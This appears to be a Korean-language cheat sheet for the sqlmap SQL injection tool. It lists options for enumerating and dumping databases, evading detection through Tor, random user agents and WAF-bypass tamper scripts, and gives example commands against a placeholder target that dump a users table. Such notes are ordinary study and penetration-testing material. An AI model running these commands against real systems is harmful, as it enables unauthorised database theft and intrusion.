# sqlmap 옵션 정리

## 1. 기본 사용법

```bash
sqlmap -u "http://target.com/vuln.php?id=1" [옵션]
```

- `-u` : 공격할 URL 지정
- `-r` : 요청 내용을 담은 파일 사용 (ex. Burp Suite에서 내보낸 요청)
- `--data` : POST 데이터 직접 입력
- `-p` : 테스트할 파라미터 지정

## 2. 주요 옵션 설명

### 탐지 관련

- `--dbs` : 데이터베이스 목록 조회
- `--tables` : 테이블 목록 조회 (DB 지정 필요: `-D`)
- `--columns` : 컬럼 목록 조회 (테이블 지정 필요: `-T`)
- `--dump` : 데이터 덤프 (컬럼/테이블/DB 지정 가능)
- `--schema` : DB 구조 전체 출력
- `--search` : 특정 문자열이 포함된 테이블/컬럼 검색

### 인증/세션

- `--cookie` : 쿠키 직접 지정
- `--auth-type` : 인증 방식 지정 (ex. Basic, Digest)
- `--auth-cred` : 인증 정보 입력 (ex. user:pass)
- `--proxy` : 프록시 사용 (ex. http://127.0.0.1:8080)

### 우회/탐지 우회

- `--random-agent` : User-Agent 랜덤 변경
- `--tor` : Tor 네트워크 사용
- `--delay` : 요청 간 딜레이 (초)
- `--timeout` : 타임아웃 설정
- `--threads` : 동시 스레드 수 조절

### 공격 방식

- `--technique` : 사용할 SQLi 기법 지정 (B: Boolean, E: Error, U: Union, S: Stacked, T: Time, Q: Inline)
- `--level` : 테스트 강도 (1~5, 기본 1)
- `--risk` : 위험도 (1~3, 기본 1)

### 기타

- `-o` : 최적화 옵션 자동 적용
- `--batch` : 모든 질문 자동 "yes"
- `--tamper` : 우회용 tamper 스크립트 적용
- `--output-dir` : 결과 저장 경로 지정

## 3. 실전 예시

### 데이터베이스 목록 확인

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --dbs
```

### 특정 DB의 테이블 확인

```bash
sqlmap -u "http://target.com/vuln.php?id=1" -D testdb --tables
```

### 특정 테이블의 데이터 덤프

```bash
sqlmap -u "http://target.com/vuln.php?id=1" -D testdb -T users --dump
```

### POST 요청, 쿠키, 프록시 사용

```bash
sqlmap -u "http://target.com/vuln.php" --data="id=1" --cookie="PHPSESSID=xxxx" --proxy="http://127.0.0.1:8080" --dbs
```

## 4. 팁

- `--batch` 옵션을 사용하면 자동화에 유리함
- `--tamper`로 WAF 우회 가능 (ex. `--tamper=between,space2comment`)
- `-p`로 특정 파라미터만 지정해 효율적 테스트 가능

---

실제 상황에 맞게 옵션을 조합해 사용하면 됨. 자세한 옵션은 `sqlmap --help` 참고.
